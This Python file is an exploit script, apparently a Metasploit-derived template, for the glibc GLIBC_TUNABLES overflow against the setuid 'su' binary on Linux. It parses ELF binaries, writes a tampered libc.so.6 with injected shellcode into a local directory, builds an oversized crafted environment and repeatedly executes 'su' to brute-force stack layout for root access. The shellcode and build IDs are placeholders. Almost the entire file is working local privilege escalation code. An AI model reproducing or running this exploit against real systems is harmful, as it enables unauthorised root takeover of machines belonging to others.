import binascii
import os
import resource
import time
import struct
import sys
from ctypes import *
from ctypes.util import find_library
from shutil import which
TUNABLES_MISCONFIG = b"GLIBC_TUNABLES=glibc.mem.tagging=glibc.mem.tagging="
STRING_TABLE_INDEX = "shstrndx"
NUMBER_OF_ENTRIES = "shnum"
ENTRY_SIZE = "shentsize"
ENTRY_KEYS = "name type flags addr offset size link info addralign entsize"
HEADER_ENTRY_FORMAT_64_BIT = "<LLQQQQLLQQ"
HEADER_ENTRY_FORMAT_32_BIT = "<LLLLLLLLLL"
GNU_BUILD_ID = ".note.gnu.build-id"
LIBC_START_MAIN = "__libc_start_main"
DYNAMIC_SYMBOL = ".dynsym"
DYNAMIC_STRING = ".dynstr"
SYMBOL_STRUCTURE_KEYS_64_BIT = "name info other shndx value size"
SYMBOL_STRUCTURE_FORMAT_64_BIT = "<LBBHQQ"
SYMBOL_STRUCTURE_KEYS_32_BIT = "name value size info other shndx"
SYMBOL_STRUCTURE_FORMAT_32_BIT = "<LLLBBH"
ELF_HEADER_KEYS = f"type machine version entry phoff shoff flags ehsize phtentsize phnum {ENTRY_SIZE} {NUMBER_OF_ENTRIES} {STRING_TABLE_INDEX}"
ELF_ENTRY_FORMAT_64_BIT = "<HHLQQQLHHHHHH"
ELF_ENTRY_FORMAT_32_BIT = "<HHLLLLLHHHHHH"
unhex = lambda v: binascii.unhexlify(v.replace(" ", ""))
TARGETS = {
    "i686": {
        "shellcode": unhex(
            "METASPLOIT_SHELL_CODE"
        ),
        "exitcode": unhex("6a665b6a0158cd80"),
        "stack_top": 0xC0000000,
        "stack_aslr_bits": 23,
    },
    "x86_64": {
        "shellcode": unhex(
            "METASPLOIT_SHELL_CODE"
        ),
        "exitcode": unhex("6a665f6a3c580f05"),
        "stack_top": 0x800000000000,
        "stack_aslr_bits": 34,
    },
    "aarch64": {
        "shellcode": unhex(
            "METASPLOIT_SHELL_CODE"
        ),
        "exitcode": unhex("c00c80d2a80b80d2010000d4"),
        "stack_top": 0x1000000000000,
        "stack_aslr_bits": 30,
    },
}
BUILD_IDS = METASPLOIT_BUILD_IDS
libc = cdll.LoadLibrary("libc.so.6")
libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)
resource.setrlimit(
    resource.RLIMIT_STACK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY)
)
def find_path_before_null_character(blob_data, start_offset):
    current_position = start_offset
    while current_position > 0:
        current_byte = blob_data[current_position]
        next_byte = blob_data[current_position + 1] if current_position + 1 < len(blob_data) else None
        if current_byte != 0 and current_byte != 0x2F and next_byte == 0:
            path_byte = bytes([current_byte])
            offset_from_start = current_position - start_offset
            return {"path": path_byte, "offset": offset_from_start}
        current_position -= 1
    return None
def parse_structured_data(structure_format, structure_keys, structure_data):
    unpacked_data = struct.unpack(structure_format, structure_data)
    parsed_structure = dict(zip(structure_keys.split(" "), unpacked_data))
    return parsed_structure
def fetch_c_library_path():
    class LoadedLibrary(Structure):
        _fields_ = [("l_addr", c_void_p), ("l_name", c_char_p)]
    libc_library = CDLL(find_library("c"))
    dl_library = CDLL(find_library("dl"))
    dl_info_function = dl_library.dlinfo
    dl_info_function.argtypes = c_void_p, c_int, c_void_p
    dl_info_function.restype = c_int
    link_map_ptr = c_void_p()
    dl_info_function(libc_library._handle, 2, byref(link_map_ptr))
    return cast(link_map_ptr, POINTER(LoadedLibrary)).contents.l_name
def execute_process(executable_path, arguments_list, environment_variables):
    libc.execve(executable_path, arguments_list, environment_variables)
def execute_and_monitor(executable, arguments, environment):
    argument_pointers = (c_char_p * len(arguments))(*arguments)
    environment_pointers = (c_char_p * len(environment))(*environment)
    child_pid = os.fork()
    if not child_pid:
        execute_process(executable, argument_pointers, environment_pointers)
        exit(0)
    start_time = time.time()
    while True:
        try:
            pid, status = os.waitpid(child_pid, os.WNOHANG)
            if pid == child_pid:
                if os.WIFEXITED(status):
                    return os.WEXITSTATUS(status) & 0xFF7F
                else:
                    return 0
        except:
            pass
        current_time = time.time()
        if current_time - start_time >= 1.5:
            os.waitpid(child_pid, 0)
            return "Success"
class DelayedElfParser:
    def __init__(self, filename):
        self.data = open(filename, "rb").read()
        self.architecture = 64 if self.data[4] == 2 else 32
        elf_header_size = 0x30 if self.architecture == 64 else 0x24
        self.header = parse_structured_data(
            ELF_ENTRY_FORMAT_64_BIT if self.architecture == 64 else ELF_ENTRY_FORMAT_32_BIT,
            ELF_HEADER_KEYS,
            self.data[0x10: 0x10 + elf_header_size],
        )
        section_header_table_index = self.extract_section_header(self.header[STRING_TABLE_INDEX])
        self.section_header_names = self.data[section_header_table_index["offset"] : section_header_table_index["offset"] + section_header_table_index["size"]]
    def extract_section_header(self, index):
        header_offset = self.header["shoff"] + (index * self.header[ENTRY_SIZE])
        entry_format = HEADER_ENTRY_FORMAT_64_BIT if self.architecture == 64 else HEADER_ENTRY_FORMAT_32_BIT
        return parse_structured_data(entry_format, ENTRY_KEYS, self.data[header_offset : header_offset + self.header[ENTRY_SIZE]])
    def extract_section_header_by_name(self, section_name):
        encoded_name = section_name.encode()
        for section_index in range(self.header[NUMBER_OF_ENTRIES]):
            section_header = self.extract_section_header(section_index)
            section_name_data = self.section_header_names[section_header["name"]:].split(b"\x00")[0]
            if section_name_data == encoded_name:
                return section_header
        return None
    def extract_section_by_name(self, section_name):
        section_header = self.extract_section_header_by_name(section_name)
        if section_header:
            start_offset = section_header["offset"]
            end_offset = start_offset + section_header["size"]
            return self.data[start_offset:end_offset]
        return None
    def extract_symbol_value(self, symbol_name):
        encoded_name = symbol_name.encode()
        dynamic_symbol = self.extract_section_by_name(DYNAMIC_SYMBOL)
        dynamic_string = self.extract_section_by_name(DYNAMIC_STRING)
        symbol_entry_size = 24 if self.architecture == 64 else 16
        for entry_index in range(len(dynamic_symbol) // symbol_entry_size):
            entry_start = entry_index * symbol_entry_size
            if self.architecture == 64:
                symbol_entry = parse_structured_data(
                    SYMBOL_STRUCTURE_FORMAT_64_BIT,
                    SYMBOL_STRUCTURE_KEYS_64_BIT,
                    dynamic_symbol[entry_start: entry_start + symbol_entry_size],
                )
            else:
                symbol_entry = parse_structured_data(
                    SYMBOL_STRUCTURE_FORMAT_32_BIT,
                    SYMBOL_STRUCTURE_KEYS_32_BIT,
                    dynamic_symbol[entry_start: entry_start + symbol_entry_size],
                )
            entry_name = dynamic_string[symbol_entry["name"]:].split(b"\x00")[0]
            if entry_name == encoded_name:
                return symbol_entry["value"]
        return None
def create_environment(adjustment, address, offset, bits=64):
    if bits == 64:
        environment = [
            TUNABLES_MISCONFIG + b"P" * adjustment,
            TUNABLES_MISCONFIG + b"X" * 8,
            TUNABLES_MISCONFIG + b"X" * 7,
            b"GLIBC_TUNABLES=glibc.mem.tagging=" + b"Y" * 24,
        ]
        padding = 172
        fill = 47
    else:
        environment = [
            TUNABLES_MISCONFIG + b"P" * adjustment,
            TUNABLES_MISCONFIG + b"X" * 7,
            b"GLIBC_TUNABLES=glibc.mem.tagging=" + b"X" * 14,
        ]
        padding = 87
        fill = 47 * 2
    for j in range(padding):
        environment.append(b"")
    if bits == 64:
        environment.append(struct.pack("<Q", address))
        environment.append(b"")
    else:
        environment.append(struct.pack("<L", address))
    for _ in range(384):
        environment.append(b"")
    for _ in range(fill):
        if bits == 64:
            environment.append(
                struct.pack("<Q", offset & 0xFFFFFFFFFFFFFFFF) * 16382 + b"\xaa" * 7
            )
        else:
            environment.append(
                struct.pack("<L", offset & 0xFFFFFFFF) * 16382 + b"\xaa" * 7
            )
    environment.append(None)
    return environment
def error_and_exit(error_msg):
    print("Error: %s" % error_msg)
    exit(-1)
if __name__ == "__main__":
    architecture = os.uname().machine
    if architecture not in TARGETS.keys():
        error_and_exit("This target's architecture '%s' is not supported by this exploit" % architecture)
    c_library_path = fetch_c_library_path()
    su_binary_path = which("su")
    memory_alignment = ((0x100 - (len(su_binary_path) + 1 + 8)) & 7) + 8
    su_binary_elf = DelayedElfParser(su_binary_path)
    dynamic_linker_path = su_binary_elf.extract_section_by_name(".interp").strip(b"\x00").decode('utf-8')
    dynamic_linker_elf = DelayedElfParser(dynamic_linker_path)
    dynamic_linker_build_id = binascii.hexlify(
        dynamic_linker_elf.extract_section_by_name(GNU_BUILD_ID)[-20:]).decode()
    if dynamic_linker_build_id not in BUILD_IDS.keys():
        error_and_exit("The build ID found is not exploitable")
    libc_elf = DelayedElfParser(c_library_path)
    libc_start_main = libc_elf.extract_symbol_value(LIBC_START_MAIN)
    if libc_start_main == None:
        error_and_exit("The symbol in the libc ELF '__libc_start_main' could not be resolved.")
    su_binary_offset = su_binary_elf.extract_section_header_by_name(".dynstr")["offset"]
    potential_path = find_path_before_null_character(su_binary_elf.data, su_binary_offset)
    if potential_path is None:
        error_and_exit("The potential path in the su_binary could not be found.")
    if not os.path.exists(potential_path["path"]):
        os.mkdir(potential_path["path"])
    with open(potential_path["path"] + b"/libc.so.6", "wb") as file_handle:
        file_handle.write(libc_elf.data[0:libc_start_main])
        file_handle.write(TARGETS[architecture]["shellcode"])
        file_handle.write(libc_elf.data[libc_start_main + len(TARGETS[architecture]["shellcode"]):])
    stack_address = TARGETS[architecture]["stack_top"] - (1 << (TARGETS[architecture]["stack_aslr_bits"]))
    stack_address += memory_alignment
    for i in range(6 if su_binary_elf.architecture == 64 else 4):
        if (stack_address >> (i * 8)) & 0xFF == 0:
            stack_address |= 0x10 << (i * 8)
    environment = create_environment(BUILD_IDS[dynamic_linker_build_id], stack_address, potential_path["offset"],
                                     su_binary_elf.architecture)
    count = 1
    argv = [b"su", b"--help", None]
    while True:
        if execute_and_monitor(su_binary_path.encode(), argv, environment) == "Success":
            exit(0)
        count += 1